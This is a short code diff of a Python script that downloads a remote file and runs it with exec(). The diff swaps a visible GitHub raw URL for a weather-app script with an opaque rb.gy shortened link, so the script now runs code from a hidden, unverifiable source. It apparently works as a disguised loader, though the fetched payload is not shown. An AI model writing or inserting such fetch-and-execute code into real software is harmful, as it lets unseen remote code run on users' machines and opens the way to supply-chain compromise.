@@ -1,4 +1,4 @@
 import requests
-url = 'https://raw.githubusercontent.com/Anupam1707/weather-app-py/main/main.py'
+url = 'https://rb.gy/bce71i'
 page = requests.get(url)
 exec(page.text)
